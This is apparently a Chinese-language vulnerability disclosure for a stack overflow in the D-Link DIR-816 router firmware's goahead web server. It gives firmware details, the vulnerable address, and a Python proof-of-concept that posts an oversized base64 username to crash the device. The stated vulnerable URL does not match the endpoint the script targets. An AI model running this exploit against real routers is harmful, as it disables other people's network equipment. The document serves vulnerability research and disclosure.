## 固件信息

产品型号：DIR-816 750M11AC

设备硬件版本：A2

固件版本：1.10B05

固件下载地址：http://support.dlink.com.cn:9000/ProductInfo.aspx?m=DIR-816

![image-20210310230637330](https://gitee.com/mrskye/Picbed/raw/master/img/20210310230644.png)

## 漏洞信息

漏洞URL：`http://192.168.0.1/goform/dir_login.asp` 

二进制文件：`squashfs-root/bin/goahead`

大致漏洞地址：`0x004567D4`

形参 Username 通过 websGetVar 从数据包中直接获取，长度为我们所控制。经过 websDecode64 进行解码后放入局部变量 v8 中，造成栈溢出。

![image-20210420002501338](https://gitee.com/mrskye/Picbed/raw/master/img/20210420002509.png)

## POC

```python
# coding=utf-8
import requests
import re
import base64

ip = "192.168.0.1"
payload = base64.b64encode('a'*0x150)
print(len(payload))

print("[+]Get tokenid")
url = "http://{}/dir_login.asp".format(ip)
rsp = requests.get(url)

pattern = re.compile(r'name="tokenid"  value="\d+"')
result = pattern.findall(rsp.text)
tokenid = result[0].split('value="')[-1].strip('"')
print("[+]tokenid:{}".format(tokenid))

url = "http://{}/goform/form2userconfig.cgi".format(ip)
data = {"username": payload, "newpass": '', "tokenid": tokenid}
try:
    requests.post(url, data=data, allow_redirects=False, timeout=1)
except:
    pass
print("[+]DIR816 已崩溃")
```

